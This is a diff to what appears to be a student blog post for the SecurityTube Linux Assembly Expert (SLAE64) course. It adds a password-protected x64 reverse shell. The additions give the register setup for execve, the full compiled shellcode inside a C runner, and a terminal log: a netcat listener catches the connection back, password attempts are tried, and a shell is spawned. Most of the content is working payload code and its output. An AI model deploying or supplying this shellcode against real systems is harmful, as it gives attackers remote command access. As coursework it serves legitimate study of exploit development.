@@ -323,6 +323,13 @@ comparison:
 
 manpage arguments: ```int execve(const char *pathname, char *const argv[], char *const envp[]);```
 
++ RAX will be zeroed out and used mainly for pushing its NULL DWORD. Furthermore, the syscall value for ```execve``` will be given at the ending.
++ RBX has to hold the ```//bin/sh``` value for itself to be pushed into the stack.
++ RDI may copy the value from the stack.
++ RDX must be set to zero, through the RAX DWORD.
++ RDI shall be pushed and RSI will copy the value from the stack.
++ The syscall is executed.
+
 ```term
 execve:
 
@@ -345,3 +352,73 @@ execve:
 
        syscall                ; The syscall is executed.
 ```
+
+#### Final Code
+
+The full code can be found [here](https://github.com/whitecr0wz/SLAE/blob/main/SLAE64/Assignment_2/1.asm)
+
+Let's assemble, link this and get its shellcode!
+
+```term
+whitecr0wz@SLAE64:~/assembly/assignments/Assignment_2$ nasm -f elf64 1.asm -o 1.o && ld 1.o -o 1 && for i in $(objdump -d 1 -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
+```
+
+###### C format
+
+```term
+#include <stdio.h>
+#include <string.h>
+
+unsigned char code[] = \
+"\x48\x31\xc0\x48\x31\xdb\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xed\x66\x6a\x29\x66\x58\x48\xff\xc7\x48\xff\xc7\x48\xff\xc6\x52\x0f\x05\x48\x89\xc3\xbd\xc0\xa8\x64\xcf\x66
+\x6a\x2a\x66\x58\x48\x89\xdf\x52\x55\x66\x68\x23\x28\x66\x6a\x02\x48\x89\xe6\xb2\x32\x0f\x05\x48\x31\xf6\x48\xff\xc6\x48\xff\xc6\x48\xff\xc6\x66\x6a\x21\x66\x58\x48\x89\xdf\x48\
+xff\xce\x0f\x05\x75\xf1\xeb\x2b\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x57\x5d\x55\xfe\xc0\x48\xff\xc7\x48\x83\xc6\x20\x56\x48\xbe\x46\x61\x69\x6c\x75\x72\x65\x2e\x56\x
+48\x89\xe6\xb2\x09\x0f\x05\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x57\x5d\x55\xfe\xc0\x48\xff\xc7\x48\xbe\x65\x6e\x74\x69\x61\x6c\x73\x3a\x56\xbe\x43\x72\x65\x64\x56\x4
+8\x89\xe6\xb2\x10\x0f\x05\x48\x31\xc0\x48\x31\xff\x48\x31\xd2\x52\x5d\x55\x48\x89\xe6\xb2\x1e\x0f\x05\x48\x89\xe7\x48\x31\xc0\x48\x31\xf6\x48\x31\xd2\x48\xbe\x61\x6d\x4c\x44\x53
+\x48\x38\x64\x56\x48\xbe\x4b\x36\x7a\x6a\x5a\x70\x55\x4b\x56\x48\x89\xe6\x48\x31\xc9\xb1\x10\xf3\xa6\x0f\x85\x64\xff\xff\xff\x48\x31\xc0\x50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\
+x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x66\x6a\x3b\x66\x58\x0f\x05"
+
+;
+
+main()
+{
+ 
+printf("Shellcode Length:  %d\n", (int)strlen(code));
+ 
+int (*ret)() = (int(*)())code;
+ 
+ret();
+ 
+}
+```
+
+#### EndGame
+
+```term
+whitecr0wz@SLAE64:~/assembly/assignments/Assignment_2$ gcc reverse-password.c -o reverse-password -fno-stack-protector -z execstack -w 
+whitecr0wz@SLAE64:~/assembly/assignments/Assignment_2$ ./reverse-password 
+Shellcode Length:  285
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+root@whitecr0wz:~# nc -lvp 9000 
+listening on [any] 9000 ...
+192.168.100.205: inverse host lookup failed: Unknown host
+connect to [192.168.100.207] from (UNKNOWN) [192.168.100.205] 40094
+Credentials:password
+Failure. Credentials:cmon
+Failure. Credentials:K6zjZpUKamLDSH8d
+python3 -c 'import pty;pty.spawn("/bin/bash")';
+whitecr0wz@SLAE64:/home/whitecr0wz/assembly/assignments/Assignment_2$ id 
+id 
+uid=1000(whitecr0wz) gid=1000(whitecr0wz) groups=1000(whitecr0wz),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
+whitecr0wz@SLAE64:/home/whitecr0wz/assembly/assignments/Assignment_2$
+```
+
+
+### Code
+
+This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-
+courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)
+
+Student ID: SLAE64–27812/PA-27812
+
+You can find all of the used resources within this post [here](https://github.com/whitecr0wz/SLAE/tree/main/SLAE64/Assignment_2/).
